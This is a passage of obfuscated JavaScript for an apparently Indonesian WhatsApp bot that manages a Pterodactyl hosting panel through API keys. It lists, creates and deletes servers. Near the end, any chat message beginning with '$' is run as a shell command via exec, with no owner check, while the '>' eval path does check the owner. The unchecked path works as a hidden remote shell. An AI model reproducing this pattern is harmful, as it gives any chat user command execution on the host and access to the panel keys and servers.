                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x4870b9)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x77be8d = await _0x24c9b0.json();
          if (_0x77be8d.errors) {
            return _0x1e35db(JSON.stringify(_0x77be8d.errors[0x0], null, 0x2));
          }
        }
        break;
      case "listsrv":
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x877b65 = _0x34b560[0x0] ? _0x34b560[0x0] : '1';
          let _0xa152bc = await fetch(domain + "/api/application/servers?page=" + _0x877b65, {
            'method': 'GET',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x1b3e3f = await _0xa152bc.json();
          let _0x41e6a2 = _0x1b3e3f.data;
          let _0x174d72 = "Berikut adalah daftar server:\n\n";
          for (let _0x4449da of _0x41e6a2) {
            let _0x394b25 = _0x4449da.attributes;
            let _0x1b802d = await fetch(domain + '/api/client/servers/' + _0x394b25.uuid.split`-`[0x0] + "/resources", {
              'method': "GET",
              'headers': {
                'Accept': 'application/json',
                'Content-Type': "application/json",
                'Authorization': "Bearer " + capikey
              }
            });
            let _0x2a74bb = await _0x1b802d.json();
            let _0x457e91 = _0x2a74bb.attributes ? _0x2a74bb.attributes.current_state : _0x394b25.status;
            _0x174d72 += "ID Server: " + _0x394b25.id + "\n";
            _0x174d72 += "Nama Server: " + _0x394b25.name + "\n";
            _0x174d72 += "Status: " + _0x457e91 + "\n\n";
          }
          _0x174d72 += "Halaman: " + _0x1b3e3f.meta.pagination.current_page + '/' + _0x1b3e3f.meta.pagination.total_pages + "\n";
          _0x174d72 += "Total Server: " + _0x1b3e3f.meta.pagination.count;
          await _0x1e35db.sendMessage(_0xe0b9f4.chat, {
            'text': _0x174d72
          }, {
            'quoted': _0xe0b9f4
          });
          if (_0x1b3e3f.meta.pagination.current_page < _0x1b3e3f.meta.pagination.total_pages) {
            _0xd6f2c2("Gunakan perintah " + (_0x270d27 ? _0x270d27 : '.') + "listsrv " + (_0x1b3e3f.meta.pagination.current_page + 0x1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "delsrv":
        {
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x4c0b2c = _0x34b560[0x0];
          if (!_0x4c0b2c) {
            return _0xd6f2c2("ID nya mana?");
          }
          let _0x33ea6c = await fetch(domain + "/api/application/servers/" + _0x4c0b2c, {
            'method': 'DELETE',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            }
          });
          let _0x1ad682 = _0x33ea6c.ok ? {
            'errors': null
          } : await _0x33ea6c.json();
          if (_0x1ad682.errors) {
            return _0xd6f2c2("Server tidak ditemukan");
          }
          _0xd6f2c2("Berhasil minghapus Server.");
        }
        break;
      case "totalfitur":
        {
          ngaceng = fs.readFileSync("./Drayyy.js").toString();
          matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(_0x4860be => _0x4860be.match(/case '([^']+)'/)[0x1]);
          _0xd6f2c2(" *Haii " + _0x18b719 + "*\n\n𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *" + _0x1c7e4e() + " Fitur*");
        }
        break;
      default:
    }
    if (_0x4e0900.startsWith('$')) {
      exec(_0x4e0900.slice(0x2), (_0x2f123d, _0x3b0c27) => {
        if (_0x2f123d) {
          return _0xd6f2c2(_0x2f123d);
        }
        if (_0x3b0c27) {
          return _0xd6f2c2(_0x3b0c27);
        }
      });
    }
    if (_0x4e0900.startsWith('>')) {
      if (!_0xd5b998) {
        return _0xd6f2c2(mess.only.owner);
      }
      try {
        let _0x374dd2 = await eval(_0x4e0900.slice(0x2));
        if (typeof _0x374dd2 !== "string") {
          _0x374dd2 = require('util').inspect(_0x374dd2);
        }
        await _0xd6f2c2(_0x374dd2);
      } catch (_0x2a787e) {
        _0xd6f2c2(String(_0x2a787e));
      }
    }
  } catch (_0xa9de09) {
    console.log(_0xa9de09);
    _0x1e35db.sendMessage(owner + "@s.whatsapp.net", {
      'text': '' + util.format(_0xa9de09)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});